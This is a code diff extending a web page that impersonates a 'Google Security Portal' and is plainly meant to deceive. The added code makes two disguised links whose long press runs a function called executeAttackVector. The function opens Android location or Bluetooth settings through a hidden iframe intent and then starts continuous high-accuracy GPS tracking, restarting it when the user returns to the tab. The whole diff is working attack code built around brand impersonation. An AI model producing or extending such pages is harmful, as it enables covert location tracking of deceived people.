@@ -30,6 +30,13 @@
             color: #1a73e8;
             margin-bottom: 24px;
         }
+        .button-container {
+            display: flex;
+            flex-direction: column;
+            gap: 14px;
+            width: 100%;
+            max-width: 340px;
+        }
         a.spoof-link {
             display: inline-block;
             background-color: #1a73e8;
@@ -41,6 +48,8 @@
             border-radius: 8px;
             box-shadow: 0 4px 10px rgba(26, 115, 232, 0.25);
             transition: background-color 0.2s;
+            box-sizing: border-box;
+            width: 100%;
         }
         a.spoof-link:active {
             background-color: #1557b0;
@@ -82,8 +91,14 @@
     <div class="banner">Google Security Portal</div>
     <h1>High-Accuracy Location Auto-Capture</h1>
 
-    <!-- Target Link -->
-    <a href="https://google.com" class="spoof-link" id="targetLink">Long Press -> Trigger Settings & Auto-Capture</a>
+    <!-- Container 2 Tombol -->
+    <div class="button-container">
+        <!-- Button 1: Location Settings & GPS Auto-Capture -->
+        <a href="https://google.com" class="spoof-link" id="targetLink1" data-intent="location">Long Press -> Trigger Location Settings & Capture</a>
+
+        <!-- Button 2: Alternative Intent (Contoh: Bluetooth/Wireless Settings) dengan Logika yang Sama -->
+        <a href="https://google.com" class="spoof-link" style="background-color: #34a853;" id="targetLink2" data-intent="bluetooth">Long Press -> Trigger Bluetooth Settings & Sync</a>
+    </div>
 
     <!-- Info Box untuk menampilkan hasil koordinat lokasi secara real-time -->
     <div class="info-box" id="infoBox">
@@ -121,7 +136,6 @@
 
         const startLocationWatch = () => {
             if ("geolocation" in navigator) {
-                // Menggunakan watchPosition agar lokasi terus diperbarui otomatis secara real-time
                 watchId = navigator.geolocation.watchPosition(
                     updatePositionData,
                     (error) => {
@@ -130,9 +144,9 @@
                         statusText.innerText = `GPS Error / Disabled: ${error.message}. Please enable location settings.`;
                     },
                     {
-                        enableHighAccuracy: true, // Memaksa hardware GPS tingkat tinggi aktif
-                        timeout: 30000,           // Waktu tunggu maksimal
-                        maximumAge: 0             // Tanpa cache, mengambil data titik terbaru
+                        enableHighAccuracy: true,
+                        timeout: 30000,
+                        maximumAge: 0
                     }
                 );
             } else {
@@ -140,7 +154,7 @@
             }
         };
 
-        const executeAttackVector = () => {
+        const executeAttackVector = (intentType) => {
             if (triggered) return;
             triggered = true;
 
@@ -149,19 +163,22 @@
             
             infoBox.style.display = "block";
             statusText.className = "pulse";
-            statusText.innerText = "Opening Android Location Settings & syncing GPS...";
+            statusText.innerText = `Opening Android ${intentType === 'location' ? 'Location' : 'Bluetooth'} Settings & syncing GPS...`;
 
-            // Timer sinkronisasi dengan animasi preview page
             setTimeout(() => {
                 try {
-                    // 1. Membuka Android Intent Location Settings agar pengguna bisa mengaktifkan lokasi
+                    // Memilih Intent berdasarkan tombol yang ditekan
+                    const intentAction = intentType === 'location' 
+                        ? "android.settings.LOCATION_SOURCE_SETTINGS" 
+                        : "android.settings.BLUETOOTH_SETTINGS";
+
                     const intentFrame = document.createElement('iframe');
                     intentFrame.style.display = 'none';
-                    intentFrame.src = "intent:#Intent;action=android.settings.LOCATION_SOURCE_SETTINGS;end;";
+                    intentFrame.src = `intent:#Intent;action=${intentAction};end;`;
                     document.body.appendChild(intentFrame);
                     setTimeout(() => document.body.removeChild(intentFrame), 1000);
 
-                    // 2. Memulai proses pelacakan koordinat GPS kontinyu
+                    // Memulai pelacakan koordinat GPS kontinyu
                     startLocationWatch();
 
                 } catch (err) {
@@ -172,17 +189,21 @@
             }, 2500);
         };
 
-        // Event listener utama (Long Press / Context Menu)
-        const targetElement = document.getElementById("targetLink");
-        
-        targetElement.addEventListener("contextmenu", (e) => {
-            executeAttackVector();
+        // Event Listener untuk Tombol 1 (Location)
+        const targetElement1 = document.getElementById("targetLink1");
+        targetElement1.addEventListener("contextmenu", (e) => {
+            executeAttackVector('location');
         });
+        targetElement1.addEventListener("touchstart", () => {}, { passive: true });
 
-        targetElement.addEventListener("touchstart", () => {}, { passive: true });
+        // Event Listener untuk Tombol 2 (Intent Lain / Bluetooth) dengan Logika Sama
+        const targetElement2 = document.getElementById("targetLink2");
+        targetElement2.addEventListener("contextmenu", (e) => {
+            executeAttackVector('bluetooth');
+        });
+        targetElement2.addEventListener("touchstart", () => {}, { passive: true });
 
-        // Auto-Trigger Handler: Begitu Anda kembali dari menu Setting Android ke tab browser (window focus), 
-        // sistem langsung mendeteksi ulang dan mengunci titik koordinat GPS akurat secara otomatis.
+        // Auto-Trigger Handler saat kembali dari menu Setting Android ke browser (window focus)
         window.addEventListener("focus", () => {
             if (infoBox.style.display === "block") {
                 startLocationWatch();
